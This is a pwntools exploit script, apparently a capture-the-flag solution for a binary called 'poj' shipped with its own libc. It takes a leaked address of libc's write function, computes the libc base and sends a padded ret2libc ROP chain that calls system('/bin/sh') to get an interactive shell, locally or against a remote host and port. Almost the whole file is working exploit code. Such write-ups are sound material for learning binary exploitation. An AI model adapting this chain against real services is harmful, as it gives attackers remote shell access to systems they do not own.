from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw, env={"LD_PRELOAD":"./libc.so.6"})


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './poj'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

libc = ELF("./libc.so.6", checksec=False)
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

offset = 0x48

io.recvuntil(b'address : ')

write_addr = int(io.recvline(), 16)


libc_base = write_addr -  libc.sym['write']
system = libc_base + 0x4dab0
binsh = libc_base + 0x197e34

# POP RDI gadget (found with ropper)
pop_rdi = libc_base + 0x28215
ret = libc_base + 0x2668c


info('Write addrs: %#x', write_addr)
info('libc_base base addr: %#x ', libc_base)
info('pop rdi addr: %#x ', pop_rdi)
info('ret addr: %#x ', ret)

payload = flat(
            asm('nop') * offset,
            pop_rdi,
            binsh,
            ret,
            system)


io.sendline(payload)


io.interactive()